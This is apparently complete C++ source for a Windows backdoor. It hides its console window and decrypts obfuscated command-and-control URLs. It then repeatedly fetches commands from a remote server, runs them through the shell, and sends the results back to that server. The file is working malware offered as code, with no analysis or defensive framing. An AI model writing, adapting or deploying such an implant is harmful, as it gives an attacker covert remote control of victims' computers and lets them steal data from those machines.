// encryption key for strings is: 25 in decimal
#include <stdio.h>
#include <curl/curl.h>
#include <windows.h>
#include <string>
#include <iostream>
#include <vector>
#include <sstream>
#include "library.h"

using namespace std;

string fin_dec(string enc_str, int key) {
	int data_len = enc_str.length() + 1;

	unsigned char* encrypted_tab = conv_to_tab(enc_str, data_len);
	unsigned char* decrypted_tab = decryptShellcode(encrypted_tab, data_len, key);
	string dec_str = reinterpret_cast<char*>(decrypted_tab);

	return dec_str;
}

size_t write_to_string(void *ptr, size_t size, size_t count, void *stream) {
	((string*)stream)->append((char*)ptr, 0, size*count);
	return size*count;
}

vector<string> split(const string& s, char delimiter) {
	vector<string> tokens;
	string token;
	istringstream tokenStream(s);

	while (getline(tokenStream, token, delimiter)) {
		tokens.push_back(token);
	}

	return tokens;
}

string get_client_id() {
	CURL *curl;
	CURLcode res;

	curl = curl_easy_init();
	if (curl == NULL) {
		return "HTTP request failed";
	}

	string enc_url = "qmmi#66( +7(/!7+(!7,6z+Fj|ko|k6~|mFzv}|6";
	string dec_url = fin_dec(enc_url, 25).c_str();

	curl_easy_setopt(curl, CURLOPT_URL, dec_url.c_str());

	string return_value = "";
	curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_to_string);
	curl_easy_setopt(curl, CURLOPT_WRITEDATA, &return_value);

	res = curl_easy_perform(curl);
	curl_easy_cleanup(curl);

	return return_value;
}

string exe_command(const string &command) {
	const size_t bufferSize = 4096;
	char container[bufferSize];
	// char total_response[4096] = {0};
	string total_response;

	FILE *fp = _popen(command.c_str(), "r");
	if (!fp) {
		// std::cerr << "Failed to execute command: " << command << std::endl;
		return "Failed to execute command: " + command;
	}

	try {
		while (fgets(container, bufferSize, fp) != nullptr) {
			total_response.append(container);
		}
	} catch (const std::exception& e) {
		_pclose(fp);
		throw;
	}

	// fp = _popen(command.c_str(), "r");
	// while (fgets(container, 4096, fp) != NULL) {
	// 	strcat(total_response, container);
	// }

	// _pclose(fp);

	return total_response;
}

void exf_data(const string& client_id, const string& command_output) {
	CURL *curl;
	CURLcode res;

	curl = curl_easy_init();
	if (curl) {

		char* encoded_command = curl_easy_escape(curl, command_output.c_str(), command_output.length());		

		string base_url = "qmmi#66( +7(/!7+(!7,6z+Fj|ko|k6xii7iqi&p}$";
		string sec_url = "?jq|uu$";

		string dec_base = fin_dec(base_url, 25).c_str();
		string dec_sec = fin_dec(sec_url, 25).c_str(); 

		string url = dec_base + client_id + dec_sec + encoded_command;

		curl_easy_setopt(curl, CURLOPT_URL, url.c_str());

		string response_output;
		curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_to_string);
		curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_output);

		res = curl_easy_perform(curl);

	}

	curl_easy_cleanup(curl);
}

int main() {
	HWND myWindow = GetConsoleWindow();
	ShowWindow(myWindow, 0);

	string response_os_code = get_client_id();
	// cout << "os code: " << response_os_code << endl;

	while (true) {
		Sleep(2000);

		string enc_url = "qmmi#66( +7(/!7+(!7,6z+Fj|ko|k6|a|zlm|6&p}$";
		string dec_url = fin_dec(enc_url, 25).c_str();

		string url = dec_url + response_os_code;

		CURL *curl;
		CURLcode res;
		curl = curl_easy_init();

		curl_easy_setopt(curl, CURLOPT_URL, url.c_str());

		string command;
		curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_to_string);
		curl_easy_setopt(curl, CURLOPT_WRITEDATA, &command);

		res = curl_easy_perform(curl);
		curl_easy_cleanup(curl);

		if (command.length() < 1) {
			Sleep(1000);
			continue;
		}

		string command_backup = command;
		vector<string> words = split(command_backup, ' ');

		if (words[0] == "cd" && words.size() == 2) {
			LPCTSTR path = words[1].c_str();
			bool dir_change = SetCurrentDirectory(path);

			if (dir_change) {
				string to_path = words[1];
				string info = "path succesfully changed to: " + to_path;
				exf_data(response_os_code, info);
			}
			else {
				exf_data(response_os_code, "Failed in changing path");
				continue;
			}
		}
		else {
			string command_res = exe_command(command);
			// cout << "results of command: " << command_res << endl;
			
			exf_data(response_os_code, command_res);
		}

	}


	return 0;
}